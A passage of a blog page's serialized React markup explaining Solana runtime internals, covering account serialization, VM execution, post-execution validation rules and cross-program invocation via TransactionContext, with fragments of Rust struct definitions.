token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],\"$L1d1\",\"$L1d2\",\"$L1d3\",\"$L1d4\",\"$L1d5\",\"$L1d6\",\"$L1d7\",\"$L1d8\",\"$L1d9\",\"$L1da\",\"$L1db\",\"$L1dc\",\"$L1dd\",\"$L1de\",\"$L1df\",\"$L1e0\",\"$L1e1\",\"$L1e2\",\"$L1e3\",\"$L1e4\",\"$L1e5\",\"$L1e6\",\"$L1e7\",\"$L1e8\",\"$L1e9\",\"$L1ea\",\"$L1eb\",\"$L1ec\",\"$L1ed\",\"$L1ee\",\"$L1ef\",\"$L1f0\",\"$L1f1\",\"$L1f2\",\"$L1f3\",\"$L1f4\",\"$L1f5\",\"$L1f6\",\"$L1f7\",\"$L1f8\",\"$L1f9\",\"$L1fa\",\"$L1fb\",\"$L1fc\",\"$L1fd\",\"$L1fe\",\"$L1ff\",\"$L200\",\"$L201\",\"$L202\",\"$L203\",\"$L204\",\"$L205\",\"$L206\",\"$L207\",\"$L208\",\"$L209\",\"$L20a\",\"$L20b\",\"$L20c\",\"$L20d\",\"$L20e\",\"$L20f\",\"$L210\",\"$L211\",\"$L212\",\"$L213\",\"$L214\",\"$L215\",\"$L216\",\"$L217\",\"$L218\",\"$L219\",\"$L21a\",\"$L21b\",\"$L21c\",\"$L21d\",\"$L21e\",\"$L21f\",\"$L220\",\"$L221\",\"$L222\",\"$L223\",\"$L224\",\"$L225\",\"$L226\",\"$L227\",\"$L228\",\"$L229\",\"$L22a\",\"$L22b\",\"$L22c\",\"$L22d\",\"$L22e\",\"$L22f\",\"$L230\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"34:[\"$\",\"p\",\"p-25\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo.data\"}],\" points directly into the serialized representation within the \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region. For instance, if a program writes \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"account.data.borrow_mut()[0] = 42\"}],\", it's modifying the serialized data in VM memory.\"]}]\n"])</script><script>self.__next_f.push([1,"35:[\"$\",\"p\",\"p-26\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[[\"$\",\"mjx-container\",\"mjx-container-0\",{\"className\":\"MathJax\",\"jax\":\"SVG\",\"children\":[\"$\",\"svg\",\"svg-0\",{\"style\":{\"verticalAlign\":\"0\"},\"xmlns\":\"http://www.w3.org/2000/svg\",\"width\":\"0.988ex\",\"height\":\"1.887ex\",\"role\":\"img\",\"focusable\":\"false\",\"viewBox\":\"0 -833.9 436.6 833.9\",\"xmlnsXlink\":\"http://www.w3.org/1999/xlink\",\"children\":[[\"$\",\"defs\",\"defs-0\",{\"children\":[\"$\",\"path\",\"path-0\",{\"id\":\"MJX-2-TEX-N-31\",\"d\":\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"}]}],[\"$\",\"g\",\"g-0\",{\"stroke\":\"currentColor\",\"fill\":\"currentColor\",\"strokeWidth\":\"0\",\"transform\":\"scale(1,-1)\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"math\",\"children\":[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"msup\",\"children\":[[\"$\",\"g\",\"g-0\",{\"data-mml-node\":\"mi\"}],[\"$\",\"g\",\"g-1\",{\"data-mml-node\":\"mn\",\"transform\":\"translate(33,363) scale(0.707)\",\"children\":[\"$\",\"use\",\"use-0\",{\"data-c\":\"31\",\"xlinkHref\":\"#MJX-2-TEX-N-31\"}]}]]}]}]}]]}]}],\" Programs can interact directly with the serialized bytes. Parsing serialized accounts into \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo\"}],\" is just what the solana program sdk does to make life easier for developers.\"]}]\n"])</script><script>self.__next_f.push([1,"36:[\"$\",\"h3\",\"h3-4\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Phase 2: Program Execution\"}]\n"])</script><script>self.__next_f.push([1,"37:[\"$\",\"p\",\"p-27\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Once the accounts are serialized and loaded into the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"INPUT\"}],\" region, the rBPF VM executes the program bytecode. The program has absolute control over its virtual memory space. It can overwrite account balances, change ownership, modify data, even corrupt the entire memory space. This design choice allows for maximum performance during execution, with security enforcement deferred to the validation phase.\"]}]\n"])</script><script>self.__next_f.push([1,"38:[\"$\",\"h3\",\"h3-5\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Phase 3: Post-Execution Validation\"}]\n39:[\"$\",\"p\",\"p-28\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"After the program finishes execution, the validator validates every change made during execution. It doesn't trust anything that happened during execution. Instead, it carefully checks every modification to ensure no rules were broken and no money was stolen.\"}]\n3a:[\"$\",\"p\",\"p-29\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Validation rules ensure state consistency and permission enforcement before persisting account state updates to storage:\"}]\n"])</script><script>self.__next_f.push([1,"3b:[\"$\",\"ul\",\"ul-0\",{\"className\":\"text-lg sm:text-xl py-2 text-pretty sm:text-justify text-white/70 list-disc pl-6\",\"children\":[\"\\n\",[\"$\",\"li\",\"li-0\",{\"className\":\"my-2\",\"children\":[\"Account fields modifiable only if the account is marked writable in the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Transaction\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instruction\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-1\",{\"className\":\"my-2\",\"children\":[\"Only the account owner modifies \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"owner\"}],\" and \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"data\"}],\".\"]}],\"\\n\",[\"$\",\"li\",\"li-2\",{\"className\":\"my-2\",\"children\":[[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Owner\"}],\" modifiable only when data is zeroed.\"]}],\"\\n\",[\"$\",\"li\",\"li-3\",{\"className\":\"my-2\",\"children\":\"Lamports can be increased by anyone but decreased only by the owner.\"}],\"\\n\",[\"$\",\"li\",\"li-4\",{\"className\":\"my-2\",\"children\":\"Total lamports remains consistent across transaction execution.\"}],\"\\n\"]}]\n"])</script><script>self.__next_f.push([1,"3c:[\"$\",\"h3\",\"h3-6\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"Phase 4: Final Commit\"}]\n3d:[\"$\",\"p\",\"p-30\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"After all validation rules pass, the modified account states are committed back to the database. All changes made during program execution are now persisted and the transaction is confirmed. If any validation rule fails, the entire transaction is rejected and no changes are stored.\"}]\n3e:[\"$\",\"p\",\"p-31\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Sounds simple, right?\"}]\n3f:[\"$\",\"h2\",\"h2-4\",{\"className\":\"text-3xl sm:text-4xl mt-8 mb-3 pb-2 border-b border-white/10 text-white text-glow\",\"children\":\"When Programs Need to Talk: Cross-Program Invocation (v1.14.x)\"}]\n40:[\"$\",\"p\",\"p-32\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"But what happens when programs need to invoke each other, for instance, when your dex program needs to call the token program to transfer tokens? This is where Cross-Program Invocation (CPI) comes in, and where the elegant simplicity of single program execution starts to break down.\"}]\n41:[\"$\",\"p\",\"p-33\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"The challenge is that each program runs in its own isolated VM with its own memory space. When Program A calls Program B, they can't simply share pointers or objects. Account data must be carefully marshaled between these isolated environments while maintaining security and consistency.\"}]\n42:[\"$\",\"h3\",\"h3-7\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"TransactionContext: Shared Account Cache\"}]\n"])</script><script>self.__next_f.push([1,"43:[\"$\",\"p\",\"p-34\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"This brings us to a detail we omitted up till now. Since \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Transaction\"}],\" are atomic and may include multiple \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instruction\"}],\", it must have a way to cache temporal execution results of earlier \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instructions\"}],\" before latter \",[\"$\",\"code\",\"code-3\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instructions\"}],\" finish. This cache is crucial since we can't allow executions effects of earlier \",[\"$\",\"code\",\"code-4\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instructions\"}],\" to persist if unfortunately latter \",[\"$\",\"code\",\"code-5\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instructions\"}],\" revert.\"]}]\n"])</script><script>self.__next_f.push([1,"44:[\"$\",\"p\",\"p-35\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"To this end, Solana introduces the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" structure state caching. The \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" contains \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountSharedData\"}],\" structures, which are used to hold changes to accounts before the runtime either commits the changes to permanent storage, or reverts them later.\"]}]\n"])</script><script>self.__next_f.push([1,"45:[\"$\",\"pre\",\"pre-4\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"pub\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-3\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"struct\"]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token token type-definition\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"TransactionContext\"]}],[\"$\",\"span\",\"code-segment-6\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-7\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}],[\"$\",\"span\",\"code-segment-8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-10\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    account_keys\"]}],[\"$\",\"span\",\"code-segment-11\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segment-12\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}],[\"$\",\"span\",\"code-segment-13\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pin\"]}],[\"$\",\"span\",\"code-segment-14\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-15\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Box\"]}],[\"$\",\"span\",\"code-segment-16\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}],[\"$\",\"span\",\"code-segment-17\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"[\"]}],[\"$\",\"span\",\"code-segment-18\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Pubkey\"]}],[\"$\",\"span\",\"code-segment-19\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"]\"]}],[\"$\",\"span\",\"code-segment-20\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\u003e\"]}],[\"$\",\"span\",\"code-segment-21\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}],[\"$\",\"span\",\"code-segment-22\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"              \"]}],[\"$\",\"span\",\"code-segment-23\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// All account addresses in transaction\"]}],[\"$\",\"span\",\"code-segment-24\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--3\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[3]}],\"$L231\",\"$L232\",\"$L233\",\"$L234\",\"$L235\",\"$L236\",\"$L237\",\"$L238\",\"$L239\",\"$L23a\",\"$L23b\",\"$L23c\",\"$L23d\",\"$L23e\",\"$L23f\",\"$L240\",\"$L241\",\"$L242\",\"$L243\",\"$L244\",\"$L245\",\"$L246\",\"$L247\",\"$L248\",\"$L249\",\"$L24a\",\"$L24b\",\"$L24c\",\"$L24d\",\"$L24e\",\"$L24f\",\"$L250\",\"\\n\",\"$L251\",\"$L252\",\"$L253\",\"$L254\",\"$L255\",\"$L256\",\"$L257\",\"$L258\",\"$L259\",\"$L25a\",\"$L25b\",\"$L25c\",\"$L25d\",\"$L25e\",\"$L25f\",\"$L260\",\"$L261\",\"$L262\",\"$L263\",\"$L264\",\"$L265\",\"$L266\",\"$L267\",\"$L268\",\"$L269\",\"$L26a\",\"$L26b\",\"$L26c\",\"$L26d\",\"$L26e\",\"$L26f\",\"$L270\",\"$L271\",\"\\n\",\"$L272\",\"$L273\",\"$L274\",\"$L275\",\"$L276\",\"$L277\",\"$L278\",\"$L279\",\"$L27a\",\"$L27b\",\"$L27c\",\"$L27d\",\"$L27e\",\"$L27f\",\"$L280\",\"$L281\",\"$L282\",\"$L283\",\"$L284\",\"$L285\",\"$L286\",\"$L287\",\"$L288\",\"$L289\",\"$L28a\",\"$L28b\",\"$L28c\",\"$L28d\",\"$L28e\",\"$L28f\",\"$L290\",\"$L291\",\"$L292\",\"$L293\",\"$L294\",\"$L295\",\"$L296\",\"$L297\",\"$L298\",\"$L299\",\"$L29a\",\"$L29b\",\"$L29c\",\"$L29d\",\"$L29e\",\"$L29f\",\"$L2a0\",\"$L2a1\",\"$L2a2\"]]}]}]]}]}]\n"])</script><script>self.__next_f.push([1,"46:[\"$\",\"p\",\"p-36\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"Handling CPI is somewhat similar to handling multiple \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"Instructions\"}],\", so the same \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" can be repurposed to pass information between programs.\"]}]\n"])</script><script>self.__next_f.push([1,"47:[\"$\",\"p\",\"p-37\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"On CPI calls / returns, we need to expose the latest account states from the invoking side to the receiving side of the CPI. Solana runtime does this by first validating the latest changes to the account and committing them into the \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\", then passing the accounts in the \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" into the other VM.\"]}]\n"])</script><script>self.__next_f.push([1,"48:[\"$\",\"h3\",\"h3-8\",{\"className\":\"text-2xl sm:text-3xl mt-6 mb-2 text-white\",\"children\":\"CPI Call Process\"}]\n49:[\"$\",\"p\",\"p-38\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"$\",\"span\",\"img-0\",{\"className\":\"block my-8\",\"children\":[\"$\",\"img\",null,{\"className\":\"mx-auto\",\"src\":\"/blog/2025_06_27/cpi_call.png\",\"alt\":\"CPI Call\"}]}]}]\n"])</script><script>self.__next_f.push([1,"4a:[\"$\",\"p\",\"p-39\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\" we described earlier lives on the host and serves as the bridge between two isolated VMs. When Program A calls Program B, each program runs in its own separate VM with isolated memory spaces, but they share account state through the host-side \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"TransactionContext\"}],\". Here's what happens:\"]}]\n"])</script><script>self.__next_f.push([1,"4b:[\"$\",\"h4\",\"h4-0\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 1: Instruction Crafting\"}]\n4c:[\"$\",\"p\",\"p-40\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":\"Program A constructs a CPI instruction specifying the callee's program ID and metadata of accounts involved. This includes each account's address, whether the account's owner has signed the instruction, and whether the account should be writable.\"}]\n4d:[\"$\",\"h4\",\"h4-1\",{\"className\":\"text-xl sm:text-2xl mt-4 mb-2 text-white\",\"children\":\"Step 2: Load Account Data\"}]\n"])</script><script>self.__next_f.push([1,"4e:[\"$\",\"p\",\"p-41\",{\"className\":\"text-lg sm:text-xl mb-4 text-pretty sm:text-justify text-white/70 leading-relaxed\",\"children\":[\"The runtime creates \",[\"$\",\"code\",\"code-0\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount\"}],\" structures by resolving \",[\"$\",\"code\",\"code-1\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"AccountInfo\"}],\" structures from Program A's VM memory. These \",[\"$\",\"code\",\"code-2\",{\"className\":\"whitespace-nowrap rounded px-1 border border-white/20 text-white font-mono\",\"style\":{\"background\":\"rgba(255, 255, 255, 0.1)\",\"fontSize\":\"0.9em\"},\"children\":\"CallerAccount\"}],\" structures hold mutable references pointing directly into Program A's serialized account data, and will be used later during CPI return to efficiently update the caller's state.\"]}]\n"])</script><script>self.__next_f.push([1,"4f:[\"$\",\"pre\",\"pre-5\",{\"children\":[\"$\",\"div\",\"code-0\",{\"className\":\"relative my-6 border border-white/10 bg-black/60\",\"children\":[[\"$\",\"div\",null,{\"className\":\"absolute -top-3 left-4 px-2 bg-[#050505] text-xs tracking-[0.2em] text-white/40 font-mono uppercase\",\"children\":[\":: \",\"RUST\"]}],[\"$\",\"div\",null,{\"className\":\"rounded-sm !bg-transparent !m-0\",\"style\":{\"color\":\"#ccc\",\"background\":\"#0a0a0a\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"whiteSpace\":\"pre\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\",\"padding\":\"1em\",\"margin\":\".5em 0\",\"overflow\":\"auto\",\"border\":\"1px solid rgba(255, 255, 255, 0.15)\",\"boxShadow\":\"0 0 20px rgba(255, 255, 255, 0.03), inset 0 0 30px rgba(0, 0, 0, 0.5)\"},\"children\":[\"$\",\"code\",null,{\"className\":\"language-rust\",\"style\":{\"whiteSpace\":\"pre\",\"color\":\"#e0e0e0\",\"background\":\"none\",\"fontFamily\":\"Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace\",\"fontSize\":\"1em\",\"textAlign\":\"left\",\"wordSpacing\":\"normal\",\"wordBreak\":\"normal\",\"wordWrap\":\"normal\",\"lineHeight\":\"1.5\",\"MozTabSize\":\"4\",\"OTabSize\":\"4\",\"tabSize\":\"4\",\"WebkitHyphens\":\"none\",\"MozHyphens\":\"none\",\"msHyphens\":\"none\",\"hyphens\":\"none\"},\"children\":[false,[[\"$\",\"span\",\"line-number--1\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[1]}],[\"$\",\"span\",\"code-segment-1\",{\"className\":\"token token\",\"style\":{\"color\":\"#999\"},\"children\":[\"// Resolved view of AccountInfo with direct field access\"]}],[\"$\",\"span\",\"code-segment-2\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--2\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[2]}],[\"$\",\"span\",\"code-segment-4\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segment-5\",{\"className\":\"token 